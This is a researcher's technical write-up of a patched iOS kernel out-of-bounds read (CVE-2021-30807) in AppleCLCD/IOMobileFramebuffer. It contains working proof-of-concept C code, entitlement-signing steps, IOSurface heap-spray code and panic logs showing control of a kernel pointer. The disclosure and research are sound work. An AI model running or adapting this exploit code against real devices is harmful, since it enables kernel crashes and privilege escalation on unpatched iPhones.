# WebContent->EL1 LPE: OOBR in AppleCLCD / IOMobileFrameBuffer

While reversing some of the accessible IOServices from the app sandbox, I went into a very straightforward vulnerability in *AppleCLCD* / *IOMobileFrameBuffer* (the respected userclients share the same external methods table). I kept this bug and intended to find some extra time to work on it in August. But then, iOS [14.7.1](https://support.apple.com/en-us/HT212623) came along, and I was surprised to see it was fixed as "in-the-wild" as CVE-2021-30807. Just to be clear, I intended to submit this bug to Apple right after I'll finish the exploit. I wanted to get a high-quality submission, but I did not have the time to invest in tfp0 in March. I wanted to share the knowledge and the details involved here, hoping it would help more folks in our community with their research. While building the POC is an immediate step that worked at the first shot (the vulnerability is as trivial and straightforward as it can get), the exploitation process is quite interesting here.

First of all, let me drop here a hash I [tweeted](https://twitter.com/AmarSaar/status/1376330319582920711) a few months ago, with the content:

```bash
saaramar@Saars-Air clcd_controlled_idx % cat description_and_poc.txt | shasum -a 512
d36248d389e069acf611f8f69f93c0ec8b96da1ac9c84e3323355db7e4892fc26394bcef3cf1ef17a1a591f3a0443141534960e011da6371f03c70c7967b484b  -
saaramar@Saars-Air clcd_controlled_idx % cat description_and_poc.txt                
Very straightforward vulnerability: the last external method (selector 83) of AppleCLCD/IOMobileFramebuffer (they share the same sMethods table) lacks any bound checks on the index given as the input[0], the first scalar to the method. The following POC triggers a panic:

void trigger_clcd_vuln(void) {
  kern_return_t ret;
  io_connect_t shared_user_client_conn = MACH_PORT_NULL;
  int type = 2;
  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
                            IOServiceMatching("IOMobileFramebuffer"));
   
  if(service == MACH_PORT_NULL) {
    printf("failed to open service\n");
    return;
  }
   
  printf("service: 0x%x\n", service);

  ret = IOServiceOpen(service, mach_task_self(), type, &shared_user_client_conn);
  if(ret != KERN_SUCCESS) {
    printf("failed to open userclient: %s\n", mach_error_string(ret));
    return;
  }
   
  printf("client: 0x%x\n", shared_user_client_conn);
   
  printf("call externalMethod\n");
  uint64_t scalars[4] = { 0x0 };
  scalars[0] = 0x41414141;

  uint64_t output_scalars[4] = { 0 };
  uint32_t output_scalars_size = 1;

  printf("call s_default_fb_surface\n");
  ret = IOConnectCallMethod(shared_user_client_conn, 83,
           scalars, 1,
    	      NULL, 0, //input, input_size,
    		  output_scalars, &output_scalars_size,
        	  NULL, NULL); //output, &output_size);

  if(ret != KERN_SUCCESS) {
    printf("failed to call external method: 0x%x --> %s\n", ret, mach_error_string(ret));
    return;
  }
   
  printf("external method returned KERN_SUCCESS\n");
   
  IOServiceClose(shared_user_client_conn);
  printf("success!\n");
}

The panic:

  "build" : "iPhone OS 14.4.1 (18D61)",
  "product" : "iPhone10,3",
  "kernel" : "Darwin Kernel Version 20.3.0: Tue Jan  5 18:34:47 PST 2021; root:xnu-7195.80.35~2\/RELEASE_ARM64_T8015",
  "incident" : "5526E312-E093-4A29-8366-248751EB20DC",
  "crashReporterKey" : "b03b0cfc811a7f8e91fa5e0678362b6b3190450e",
  "date" : "2021-03-29 02:37:43.07 +0300",
  "panicString" : "panic(cpu 1 caller 0xfffffff027e53660): Kernel data abort. at pc 0xfffffff0282e8830, lr 0xfffffff0282dbb68 (saved state: 0xffffffe811c63420)\n\t  x0: 0xffffffe4cdc7ccb0  x1:  0xffffffe19c2a0628  x2:  0xffffffe811c637fc  x3:  0x0000000041414141\n\t  x4: 0x0000000000000000  x5:  0x0000000000000000  x6:  0x0000000000000000  x7:  0x0000000000000a10\n\t  x8: 0xffffffe4cdc7ccb0  x9:  0x0000000041414141  x10: 0xffffffe6d7d1e110  x11: 0x0000000041414141\n\t  x12: 0x0000000000000002 x13: 0x0000000000000002  x14: 0xffffffe19bcdeee8  x15: 0x0000000000000003\n\t  x16: 0x0000000000008000 x17: 0xfffffff027e50b28  x18: 0xfffffff027e45000  x19: 0xffffffe811c63940\n\t  x20: 0x0000000000000000 x21: 0xffffffe4cdc58000  x22: 0xfffffff027645a08  x23: 0x00000000e00002c2\n\t  x24: 0x0000000000000000 x25: 0xffffffe811c63aec  x26: 0xffffffe4ce60d570  x27: 0xffffffe4cdf1df44\n\t  x28: 0x0000000000000000 fp:  0xffffffe811c637a0  lr:  0xfffffff0282dbb68  sp:  0xffffffe811c63770\n\t  pc:  0xfffffff0282e8830 cpsr: 0x60400204         esr: 0x96000006          far: 0xffffffe6d7d1e110\n\nDebugger message: panic\nMemory ID: 0x1\nOS release type:%                                saaramar@Saars-Air clcd_controlled_idx % 
```

## The vulnerability

Let's start with understanding the vulnerability, how we can trigger it and what it gives us. The vulnerability is in a flow called from the external method 83 of *AppleCLCD*/*IOMFB* (which is *IOMobileFramebufferUserClient::s_displayed_fb_surface*). The following decompile code is from iOS 14 beta, but it is basically the same in later versions:

```c++
__int64 __fastcall IOMobileFramebufferUserClient::s_displayed_fb_surface(IOUserClient **a1, __int64 a2, IOExternalMethodArguments_s *args)
{
  __int64 v4; // [xsp+10h] [xbp-30h]
  bool v5; // [xsp+1Bh] [xbp-25h]
  unsigned int v6; // [xsp+1Ch] [xbp-24h]
  int v7; // [xsp+20h] [xbp-20h]
  unsigned int v_retval; // [xsp+24h] [xbp-1Ch]

  v_retval = 0xE00002C1;
  v7 = 0xAAAAAAAA;
  v6 = 0;
  v5 = 0;
  v4 = IOUserClient::copyClientEntitlement(a1[29], "com.apple.private.allow-explicit-graphics-priority", args);
  if ( v4 )
  {
    v5 = v4 == gOSBooleanTrue;
    (*(*v4 + 40LL))(v4);
  }
  if ( v5 )
  {
    v_retval = IOMobileFramebufferUserClient::get_displayed_surface(a1, &v6, *args->scalarInput);
    *args->scalarOutput = v6;
  }
  return v_retval;
}
```

And if we would just follow through, here is *IOMobileFramebufferUserClient::get_displayed_surface*:

``` c++
__int64 __fastcall IOMobileFramebufferUserClient::get_displayed_surface(IOMobileFramebufferUserClient *this, unsigned int *a2, unsigned int scalar0)
{
  return (*(**(this + 27) + 0x798LL))(*(this + 27), *(this + 29), a2, scalar0);
}
```

The function at +0x798 is *IOMobileFramebufferLegacy::get_displayed_surface*:

```c++
__int64 __fastcall IOMobileFramebufferLegacy::get_displayed_surface(IOMobileFramebufferLegacy *this, task *a2, unsigned int *a3, unsigned int scalar0)
{
  unsigned int v_retval; // [xsp+10h] [xbp-20h]

  v_retval = 0xE00002BC;
  if ( *(this + scalar0 + 331) && *(this + 366) )
    v_retval = IOSurfaceRoot::copyPortNameForSurfaceInTask(*(this + 366), a2, *(this + scalar0 + 331), a3);
  return v_retval;
}
```

Yep, we have full control over a 32bit integer that is being used as an index to an array (the scalar is multiplied by 8). There are no checks on this input, at all. Here is the code:

```
FFFFFFF00970ADDC LDR             X8, [SP,#0x30+v_this]
FFFFFFF00970ADE0 LDR             X0, [X8,#0xB70] ; this
FFFFFFF00970ADE4 LDUR            X1, [X29,#var_10] ; task *
FFFFFFF00970ADE8 ADD             X9, X8, #0xA58
FFFFFFF00970ADEC LDR             W10, [SP,#0x30+v_scalar0]
FFFFFFF00970ADF0 MOV             X11, X10
FFFFFFF00970ADF4 ADD             X9, X9, X11,LSL#3
FFFFFFF00970ADF8 LDR             X2, [X9] ; IOSurface *
FFFFFFF00970ADFC LDR             X3, [SP,#0x30+var_18] ; unsigned int *
FFFFFFF00970AE00 BL              IOSurfaceRoot::copyPortNameForSurfaceInTask(task *,IOSurface *,uint *)
```

A very important question is: how can we trigger this flow? Clearly, simply calling the external method 83 will do the job (and we can obtain the userclient to *AppleCLCD/IMOFB* from the app sandbox). However - there is a check for the *com.apple.private.allow-explicit-graphics-priority* entitlement. The app sandbox does not have this entitlement, but WebKit.WebContent does! And we can clearly obtain the required userclient from this context. So what we have here is an LPE vulnerability, triggerable from the WebContent directly (WebContent -> EL1).

Now, let's build the POC. As I showed in [description_and_poc.txt](https://github.com/saaramar/IOMobileFrameBuffer_LPE_POC/blob/main/files/description_and_poc.txt), the POC can't be any simpler. All we need to do is to obtain the userclient to *AppleCLCD/IOMobileFramBuffer* and call *IOConnectCallMethod* with selector=83, and set the scalar input to be some arbitrarily large number.

We also need to take care of the required entitlement. We have two options:

1. Running our POC from the context of WebContent
2. Add the *com.apple.private.allow-explicit-graphics-priority* entitlement to our POC and run it on a jailbroken device.

Let's do the second option. We can do it easily with codesign, as follows:

```bash
saaramar@Saars-Air appleclcd_exploit % cat make.sh         
xcrun --sdk iphoneos clang -arch arm64 -framework IOKit iosurface.c exploit.c -O3 -o appleclcd_exploit
codesign -s - appleclcd_exploit --entitlement entitlements.xml  -f
saaramar@Saars-Air appleclcd_exploit % 
```

where *entitlements.xml* is:

```xml
saaramar@Saars-Air appleclcd_exploit % cat entitlements.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>com.apple.private.security.container-required</key>
    <false/>
    <key>platform-application</key>
    <true/>
    <key>com.apple.security.iokit-user-client-class</key>
    <array>
        <string>IOSurfaceRootUserClient</string>
        <string>IOMobileFramebufferUserClient</string>
        <string>IOHIDLibUserClient</string>
    </array>
    <key>com.apple.private.allow-explicit-graphics-priority</key>
    <true/>
</dict>
</plist>

saaramar@Saars-Air appleclcd_exploit % 
```

By running this on my physical iPhone X with iOS 14.6 I got the following panic:

```
  "build" : "iPhone OS 14.6 (18F72)",
  "product" : "iPhone10,3",
  "kernel" : "Darwin Kernel Version 20.5.0: Sat May  8 02:21:43 PDT 2021; root:xnu-7195.122.1~4\/RELEASE_ARM64_T8015",
  "incident" : "6CA78199-7ACE-46B1-A70C-E6C98CF23809",
  "crashReporterKey" : "c23fc969fde41f6a019ad70f23f4a4c24a0dda2a",
  "date" : "2021-07-14 10:57:36.82 +0300",
  "panicString" : "panic(cpu 2 caller 0xfffffff00ee472d4): Kernel data abort. at pc 0xfffffff00f2cd2b0, lr 0xfffffff00f2c0478 (saved state: 0xffffffe80438b430)\n\t  x0: 0xffffffe4ccc81990  x1:  0xffffffe19a7a92f0  x2:  0xffffffe80438b800  x3:  0x0000000041414141\n\t  x4: 0x0000000000000000  x5:  0x0000000000000000  x6:  0x0000000000000000  x7:  0x00000000000002b0\n\t  x8: 0xffffffe4ccc81990  x9:  0x0000000041414141  x10: 0xffffffe4ccc82428  x11: 0x0000000041414141\n\t  x12: 0x0000000000000002 x13: 0x0000000000000002  x14: 0xffffffe19e1b6ab0  x15: 0x0000000000000003\n\t  x16: 0x0000000000000000 x17: 0x0000000000000001  x18: 0xfffffff00ee35000  x19: 0xffffffe80438b940\n\t  x20: 0x0000000000000000 x21: 0xffffffe4ccbfad90  x22: 0xfffffff00e625718  x23: 0x00000000e00002c2\n\t  x24: 0x0000000000000000 x25: 0xffffffe80438baec  x26: 0xffffffe4cd6ba2f0  x27: 0xffffffe4ccfa78d4\n\t  x28: 0x0000000000000000 fp:  0xffffffe80438b7b0  lr:  0xfffffff00f2c0478  sp:  0xffffffe80438b780\n\t  pc:  0xfffffff00f2cd2b0 cpsr: 0x60400204         esr: 0x96000006          far: 0xffffffe6d6d22e30\n\nDebugger message: panic\nMemory ID: 0x1\nOS release type: User\nOS version: 18F72\nKernel version: Darwin Kernel Version 20.5.0: Sat May  8 02:21:43 PDT 2021; root:xnu-7195.122.1~4\/RELEASE_ARM64_T8015\nKernel UUID: 64DBB08A-59ED-3D69-A79D-DC5564BA9876\niBoot version: pongoOS-2.5.0-0cb6126f\nsecure boot?: YES\nPaniclog version: 13\nKernel slide:      0x0000000006d48000\nKernel text base:  0xfffffff00dd4c000\nmach_absolute_time: 0x14ebe844454\nEpoch Time:        sec       usec\n  Boot    : 0x60ec272b 0x000ad276\n  Sleep   : 0x60ee95dc 0x0001a5b2\n  Wake    : 0x60ee98c3 0x00076ffe\n  Calendar: 0x60ee98d9 0x0007eeeb\n\nPanicked task 0xffffffe19a7a92f0: 94 pages, 1 threads: pid 890: saar_poc\nPanicked thread: 0xffffffe19b390b80, backtrace: 0xffffffe80438ac30, tid: 204291\n\t\t  lr: 0xfffffff00e7ca1cc  fp: 0xffffffe80438ac80\n\t\t  lr: 0xfffffff00e7ca024  fp: 0xffffffe80438acf0\n\t\t  lr: 0xfffffff00e8f36dc  fp: 0xffffffe80438adc0\n\t\t  lr: 0xfffffff00ee355fc  fp: 0xffffffe80438add0\n\t\t  lr: 0xfffffff00e7c9d5c  fp: 0xffffffe80438b150\n\t\t  lr: 0xfffffff00e7c9d5c  fp: 0xffffffe80438b1b0\n\t\t  lr: 0xfffffff00ff6b324  fp: 0xffffffe80438b1d0\n\t\t  lr: 0xfffffff00ee472d4  fp: 0xffffffe80438b340\n\t\t  lr: 0xfffffff00e8f3c94  fp: 0xffffffe80438b410\n\t\t  lr: 0xfffffff00ee355fc  fp: 0xffffffe80438b420\n\t\t  lr: 0xfffffff00f2c0478  fp:
...
```

Let's make sure the instruction that triggered this panic is the one we expect. Let's open the kernelcache from my physical device, and look for the address *0xfffffff00f2cd2b0-0x0000000006d48000*. This is the instruction:

```
FFFFFFF0085852B0 LDR             X10, [X10,X11,LSL#3]
```

Great! Indeed, we have a panic on the access to the array with our controlled scalar as an index. It also would be really cool to test it on Corellium (this product is fantastic) and see that we get the exact same panic:
![image](https://github.com/saaramar/IOMobileFrameBuffer_LPE_POC/raw/main/files/Corellium_poc.png)

## Exploit

Ok, so we have here an OOB read. Actually, a pretty powerful one. Whenever we face an OOB read, the first questions we need to answer are:

1. what are we reading?
2. what is it used for?
3. can we control the kalloc size of the chunk?
4. can we control the OOB index?

Well, the answer to the last question is easy. We can freely control the OOB index up to 32bit (that's way more than enough). Keep in mind that since we are talking about an index and not an offset, the actual offset will be a multiplication of 8. What is more interesting is the first two questions. The function name is *s_displayed_fb_surface*, and it does the following:

* uses our input as index to an array, in order to fetch an IOSurface
* resolves the port name of the retrieved IOSurface
* returns the port name via the output scalars

As we saw, it looks like our controlled 32bit integer is used as an index to an array, and the fetched value from the array is a pointer to an IOSurface. By looking at offset 0xa58 across the kernelcache, we can see the same use in different methods of IOMFB that supports this.

Regarding the convert of IOSurface -> port name, it's done by calling *IOSurfaceRoot::copyPortNameForSurfaceInTask*, which eventually reaches the function *IOUserClient::copyPortNameForObjectInTask*:

```c++
IOReturn
IOUserClient::copyPortNameForObjectInTask(task_t task,
    OSObject *obj, mach_port_name_t * port_name)
{
	mach_port_name_t    name;

	name = IOMachPort::makeSendRightForTask( task, obj, IKOT_IOKIT_IDENT );

	*(mach_port_name_t *) port_name = name;

	return kIOReturnSuccess;
}
```

And this is the value we get back via the output scalar. As we know:

```c++
typedef natural_t mach_port_name_t;
```

```c++
typedef uint32_t natural_t;
```

So to conclude: we can get a port name of an IOSurface we fetched OOB.

At this point, the high level plan is clear. Basically, we have two options. We can shape the heap such that the memory after our array will contain a pointer that points to:

1. A controlled/partially controlled data that we fake as IOSurface
2. An actual IOSurface

Because it would be much easier to drop a pointer to an actual IOSurface there, let's do that. Then, we can do a lot of fun things, such as freeing our IOSurface, drop there a different structure, and from there, the road to arbitrary r/w primitives is getting clearer.

### IOSurfaces

I do not want to repeat highly documented and common knowledge materials, so I'll just say the TL;DR: IOSurface represents a userspace buffer that is shared with the kernel. It's part of the fundamental framework in both iOS and macOS, and because it's so fundamental, we can obtain the userclient for *IOSurfaceRoot* from the app sandbox, WebContent, etc..

IOSurface is a fantastic structure. I'm absolutely not the first or the last one to use the primitives this structure has to offer. By just going over the external methods table of *IOSurfaceRootUserClient*, you can see that we can:

* allocate/release surfaces, by calling methods such as *IOSurfaceRootUserClient::s_create_surface* (method 0) and *IOSurfaceRootUserClient::s_release_surface* (method 1)
* spray controlled data, by calling *IOSurfaceRootUserClient::s_set_value* (method 9)

and that's just the start. For more information and some examples of how it was used in previous exploits (well, there are so many), you can look up [one](https://www.synacktiv.com/en/publications/analysis-and-exploitation-of-the-ios-kernel-vulnerability-cve-2021-1782.html), [two](https://siguza.github.io/v0rtex/), [three](https://papers.put.as/papers/ios/2019/LiangPOC.pdf) and a lot more. However, keep in mind that our vulnerable function does not give us an IOSurface id (as returned by *IOSurfaceRootUserClient::s_create_surface*). It returns the port name associated with this surface. That's fine, because we have external methods we can use, just for that:

* method 34: *IOSurfaceRootUserClient::s_lookup_surface_from_port*
* method 35: calls *IOSurfaceRootUserClient::create_port_from_surface*

### Shaping, fully control IOSurface ptr

Ok, let's get to work! The first thing we need to do is to build a POC that shapes the heap, such that after our array (at some 8-aligned offset) there will be our controlled data. After playing a little bit with IOSurfaces, I saw I'm able to spray controlled content that will be (approximately) after 0x1200000 bytes (Corellium EL1 debugging was super helpful here, saved me a lot of panics along the way :P). I built the following simple spray (takes advantage of the same implementation of *IOSurface.c* by [Brandon Azad](https://twitter.com/_bazad), just as was used [here](https://www.synacktiv.com/en/publications/analysis-and-exploitation-of-the-ios-kernel-vulnerability-cve-2021-1782.html), thanks!).

This is the shape that got me a 100% stable POC on both my physical iPhone X (14.6 18F72) and virtual iPhone XR (14.6 18F72, Corellium):

```c
bool do_spray(void) {
    char data[0x10];
    memset(data, 0x41, sizeof(data));
    
    io_connect_t iosurface_uc = get_iosurface_root_uc();
    if (iosurface_uc == MACH_PORT_NULL) {
        return false;
    }
        
    int *surface_ids = (int*)malloc(SURFACES_COUNT * sizeof(int));
    for (size_t i = 0; i < SURFACES_COUNT; ++i) {
        surface_ids[i] = create_surface(iosurface_uc);
        if (surface_ids[i] <= 0) {
            return false;
        }
        
        if (IOSurface_spray_with_gc(iosurface_uc, surface_ids[i], 20, 200, data, sizeof(data), NULL) == false) {
            printf("iosurface spray failed\n");
            return false;
        }
    }
    
    return true;
}

```

After doing this shape, I triggered the bug with an index that I found reliable by dumping the memory (debugging virtual iPhone XR, 14.6, 18F72):

```bash
(lldb) c
Process 1 resuming
Process 1 stopped
* thread #1, stop reason = breakpoint 1.1
    frame #0: 0xfffffff0090dfa30
->  0xfffffff0090dfa30: ldr    x2, [x9, x11, lsl #3]
    0xfffffff0090dfa34: ldr    x3, [sp, #0x18]
    0xfffffff0090dfa38: bl     -0xff79b3ff8
    0xfffffff0090dfa3c: str    w0, [sp, #0x10]
Target 0: (No executable module.) stopped.
(lldb) x/8gx $x9
0xffffffe4ccb0ca98: 0x0000000000000000 0x0000000000000000
0xffffffe4ccb0caa8: 0x0000000000000000 0x0000000000000000
0xffffffe4ccb0cab8: 0x0000000000000000 0x0000000000000000
0xffffffe4ccb0cac8: 0x0000000000000000 0x0000000000000000
(lldb) x/8gx $x9+$x11*8
0xffffffe4cdd0dad8: 0x0041414141414141 0x4141414141414141
0xffffffe4cdd0dae8: 0x0041414141414141 0x4141414141414141
0xffffffe4cdd0daf8: 0x0041414141414141 0x4141414141414141
0xffffffe4cdd0db08: 0x0041414141414141 0x4141414141414141
(lldb) 
```

And therefore, we can run the POC on the physical device (after adding 1 to our index, to get 0x4141414141414141 without the 0 in the MSB), and:

```text
iPhone:~ root# cat /var/mobile/Library/Logs/CrashReporter/panic-full-2021-07-19-063405.000.ips 
{"bug_type":"210","timestamp":"2021-07-19 06:34:05.00 +0300","os_version":"iPhone OS 14.6 (18F72)","incident_id":"EE6BC08D-95C1-4E42-AD96-37A7C6AAF17A"}
{
  "build" : "iPhone OS 14.6 (18F72)",
  "product" : "iPhone10,3",
  "kernel" : "Darwin Kernel Version 20.5.0: Sat May  8 02:21:43 PDT 2021; root:xnu-7195.122.1~4\/RELEASE_ARM64_T8015",
  "incident" : "EE6BC08D-95C1-4E42-AD96-37A7C6AAF17A",
  "crashReporterKey" : "c23fc969fde41f6a019ad70f23f4a4c24a0dda2a",
  "date" : "2021-07-19 06:34:05.91 +0300",
  "panicString" : "panic(cpu 1 caller 0xfffffff01a3072d4): Kernel data abort. at pc 0xfffffff01a655334, lr 0xfffffff01a655320 (saved state: 0xffffffe815c4b3a0)\n\t  x0: 0x0000000000000001  x1:  0xffffffe4ccb2fa00  x2:  0x4141414141414141  x3:  0x0000000000000000\n\t  x4: 0x0000000000000000  x5:  0x0000000000000000  x6:  0x0000000000000000  x7:  0x00000000000002b0\n\t  x8: 0xfffffff01a1bd0c4  x9:  0x0000000000000001  x10: 0xffffffe8023a0000  x11: 0x3ffffff932ed8002\n\t  x12: 0x0000000000000002 x13: 0x0000000000000002  x14: 0xffffffe19d5f59a8  x15: 0x0000000000000003\n\t  x16: 0x0000000000000000 x17: 0x0000000000000007  x18: 0xfffffff01a2f5000  x19: 0x4141414141414141\n\t  x20: 0x0000000000000001 x21: 0x0000000000000000  x22: 0xffffffe4cbb60040  x23: 0x00000000e00002c2\n\t  x24: 0x0000000000000000 x25: 0xffffffe815c4baec  x26: 0xffffffe4cd0be2f0  x27: 0xffffffe4cd119264\n\t  x28: 0x0000000000000000 fp:  0xffffffe815c4b710  lr:  0xfffffff01a655320  sp:  0xffffffe815c4b6f0\n\t  pc:  0xfffffff01a655334 cpsr: 0x20400204         esr: 0x96000004          far: 0x4141414141414141\n\nDebugger message: panic\nMemory ID: 0x1\nOS release type: User\nOS version: 18F72\nKernel version: Darwin Kernel Version 20.5.0: Sat May  8 02:21:43 PDT 2021; root:xnu-7195.122.1~4\/RELEASE_ARM64_T8015\nKernel UUID: 64DBB08A-59ED-3D69-A79D-DC5564BA9876\niBoot version: pongoOS-2.5.0-0cb6126f\nsecure boot?: YES\nPaniclog version: 13\nKernel slide:      0x0000000012208000\nKernel text base:  0xfffffff01920c000\nmach_absolute_time: 0xe8148af5\nEpoch Time:        sec       usec\n  Boot    : 0x60f4f1dc 0x00086314\n  Sleep   : 0x00000000 0x00000000\n  Wake    : 0x00000000 0x00000000\n  Calendar: 0x60f4f264 0x0000e35b\n\nPanicked task 0xffffffe19d27a5e0: 101 pages, 1 threads: pid 591: appleclcd_exploi\nPanicked thread: 0xffffffe19d632e00, backtrace: 0xffffffe815c4aba0, tid: 4713\n\t\t  lr: 0xfffffff019c8a1cc  fp: 0xffffffe815c4abf0\n\t\t  lr: 0xfffffff019c8a024  fp: 0xffffffe815c4ac60\n\t\t  lr: 0xfffffff019db36dc  fp: 0xffffffe815c4ad30\n\t\t  lr: 0xfffffff01a2f55fc  fp: 
...
```

If we'll open the kernelcache of my device, at address *0xfffffff01a655334-0x0000000012208000*, we'll see:

```
IOSurfaceSendRight__init_IOSurfaceRoot___IOSurface+40   LDR             X8, [X19]
IOSurfaceSendRight__init_IOSurfaceRoot___IOSurface+44   LDR             X8, [X8,#0x20]
IOSurfaceSendRight__init_IOSurfaceRoot___IOSurface+48   MOV             X0, X19
IOSurfaceSendRight__init_IOSurfaceRoot___IOSurface+4C   BLR             X8
```

Yes, we panicked on a dereference read of 0x4141414141414141. And exactly in the flow we expected, in *IOSurfaceSendRight::init*! The signature of this function is:

```c++
IOSurfaceSendRight::init(IOSurfaceSendRight *__hidden this, IOSurfaceRoot *, IOSurface *)
```

In this flow, x19 is set to x2 (third argument), which is IOSurface. And we control this pointer completely.

### arbitrary r/w

I intended to share here a full exploit; However, I planned to work on this at the end of August, but the vulnerability just got patched. So, because I wanted to share these details right after the patch, I hope you'll forgive me for leaving it like this :)

## Sum up

I hope you enjoyed reading this blogpost and that I managed to shed some light on the last iOS update. Of course, the approach I showed here is just one way to go. There are more techniques and ideas that could be implemented. For instance, our specific flow calls a virtual function from the object vtable. You can drop there a pointer to an object of another type, and the fun continues. 

Finally, I want to thank (again) for the two outstanding projects, [checkra1n](https://checkra.in/) and [Corellium](https://twitter.com/AmarSaar/status/1376330319582920711). I already talked a lot about how *checkra1n* was a crazy game changer for our community, but I want to mention here Corellium as well. I started to use Corellium the day they opened their product to private users, and I'm still feeling this product changed my day-to-day life regarding iOS security research. Thanks again for Corellium for their fantastic product (and the quick and informative responses!).

The POC can be found in the [repo](https://github.com/saaramar/IOMobileFrameBuffer_LPE_POC).

Thanks,

Saar Amar
